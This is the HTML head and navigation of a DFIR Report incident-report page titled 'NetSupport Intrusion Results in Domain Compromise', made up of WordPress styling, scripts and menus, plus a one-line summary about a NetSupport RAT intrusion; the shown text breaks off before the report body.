<!doctype html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<link rel="profile" href="https://gmpg.org/xfn/11">
<title>NetSupport Intrusion Results in Domain Compromise &#8211; The DFIR Report</title>
<meta name="robots" content="max-image-preview:large" />
<link rel="dns-prefetch" href="//stats.wp.com" />
<link rel="dns-prefetch" href="//c0.wp.com" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Feed" href="https://thedfirreport.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Comments Feed" href="https://thedfirreport.com/comments/feed/" />
<script type="2d56ff63091f999082d29cc6-text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thedfirreport.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<link rel="stylesheet" id="jetpack_related-posts-css" href="https://c0.wp.com/p/jetpack/13.9.1/modules/related-posts/related-posts.css" type="text/css" media="all" />
<style id="wp-emoji-styles-inline-css" type="text/css">

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel="stylesheet" id="wp-block-library-css" href="https://c0.wp.com/c/6.6.2/wp-includes/css/dist/block-library/style.min.css" type="text/css" media="all" />
<link rel="stylesheet" id="mediaelement-css" href="https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css" type="text/css" media="all" />
<link rel="stylesheet" id="wp-mediaelement-css" href="https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/wp-mediaelement.min.css" type="text/css" media="all" />
<style id="jetpack-sharing-buttons-style-inline-css" type="text/css">
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id="classic-theme-styles-inline-css" type="text/css">
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id="global-styles-inline-css" type="text/css">
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel="stylesheet" id="freenews-style-css" href="https://thedfirreport.com/wp-content/themes/freenews/style.css?ver=6.6.2" type="text/css" media="all" />
<style id="freenews-style-inline-css" type="text/css">
.tags-links, .byline, .comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel="stylesheet" id="font-awesome-css" href="https://thedfirreport.com/wp-content/themes/freenews/assets/library/fontawesome/css/all.min.css?ver=6.6.2" type="text/css" media="all" />
<link rel="stylesheet" id="freenews-google-fonts-css" href="https://thedfirreport.com/wp-content/fonts/d92fef3d9e5de6f7993b11046e265436.css" type="text/css" media="all" />
<link rel="stylesheet" id="sharedaddy-css" href="https://c0.wp.com/p/jetpack/13.9.1/modules/sharedaddy/sharing.css" type="text/css" media="all" />
<link rel="stylesheet" id="social-logos-css" href="https://c0.wp.com/p/jetpack/13.9.1/_inc/social-logos/social-logos.min.css" type="text/css" media="all" />
<script type="2d56ff63091f999082d29cc6-text/javascript" id="jetpack_related-posts-js-extra">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="2d56ff63091f999082d29cc6-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/related-posts/related-posts.min.js" id="jetpack_related-posts-js"></script>
<script type="2d56ff63091f999082d29cc6-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="2d56ff63091f999082d29cc6-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="2d56ff63091f999082d29cc6-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/global.js?ver=1" id="freenews-global-js"></script>
<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/22587" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.2" />
<link rel="canonical" href="https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/" />
<link rel="shortlink" href="https://thedfirreport.com/?p=22587" />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2023%2F10%2F30%2Fnetsupport-intrusion-results-in-domain-compromise%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2023%2F10%2F30%2Fnetsupport-intrusion-results-in-domain-compromise%2F&#038;format=xml" />

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-162747485-1" type="2d56ff63091f999082d29cc6-text/javascript"></script>
<script type="2d56ff63091f999082d29cc6-text/javascript">
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-162747485-1');
		</script>
<script type="2d56ff63091f999082d29cc6-text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//thedfirreport.com/?wordfence_lh=1&hid=35062BA19D554A9B703BE8CEFB77F74A');
</script> <style>img#wpstats{display:none}</style>
<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #f8f8f8; }
</style>

<meta property="og:type" content="article" />
<meta property="og:title" content="NetSupport Intrusion Results in Domain Compromise" />
<meta property="og:url" content="https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/" />
<meta property="og:description" content="NetSupport Manager is one of the oldest third-party remote access tools still currently on the market with over 33 years of history. This is the first time we will report on a NetSupport RAT intrus…" />
<meta property="article:published_time" content="2023-10-30T00:38:56+00:00" />
<meta property="article:modified_time" content="2023-10-31T20:36:58+00:00" />
<meta property="og:site_name" content="The DFIR Report" />
<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/2023/10/19348-006.png" />
<meta property="og:image:width" content="2362" />
<meta property="og:image:height" content="838" />
<meta property="og:image:alt" content />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="NetSupport Intrusion Results in Domain Compromise" />
<meta name="twitter:image" content="https://thedfirreport.com/wp-content/uploads/2023/10/19348-006.png?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-32x32.png" sizes="32x32" />
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-180x180.png" />
<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-270x270.png" />
</head>
<body class="post-template-default single single-post postid-22587 single-format-standard custom-background has-sidebar tags-hidden author-hidden comment-hidden">
<div id="page" class="site">
<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
<header id="masthead" class="site-header">
<div id="main-header" class="main-header">
<div class="navigation-top">
<div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav class="main-navigation" aria-label="Primary Menu" role="navigation">
<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<ul id="primary-menu" class="menu nav-menu"><li id="menu-item-21337" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li id="menu-item-21314" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li id="menu-item-21315" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
<li id="menu-item-21319" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21318" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31055" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li id="menu-item-35456" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li id="menu-item-32606" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li id="menu-item-38108" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21320" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
<li id="menu-item-21317" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li id="menu-item-21325" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li id="menu-item-21326" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
</ul>
</li>
<li id="menu-item-31033" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li id="menu-item-21312" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li id="menu-item-21313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li id="menu-item-21316" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul> </nav>
</div>
</div>
</div>
<nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
<div class="wrap">
<button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="secondary-toggle-text">Menu</span>
<span class="secondary-toggle-bar"></span>
</button>
<ul id="primary-menu" class="secondary-menu"><li id="menu-item-21323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21322" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31037" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li id="menu-item-35457" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li id="menu-item-32608" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li id="menu-item-38110" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21321" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li id="menu-item-21327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li id="menu-item-21328" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li id="menu-item-21324" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul> </div>
</nav>
<div class="main-header-brand">
<div class="header-brand">
<div class="wrap">
<div class="header-brand-content">
<div class="site-branding">
<div class="site-branding-text">
<p class="site-title"><a href="https://thedfirreport.com/" rel="home">The DFIR Report</a></p>
<p class="site-description">Real Intrusions by Real Attackers, The Truth Behind the Intrusion</p>
</div>
</div>
<div class="header-right">
<div class="header-banner">
</div>
</div>
</div>
</div>
</div>
<div id="nav-sticker">
<div class="navigation-top">
<div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav id="site-navigation" class="main-navigation" aria-label="Primary Menu">
<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<ul id="primary-menu" class="menu nav-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
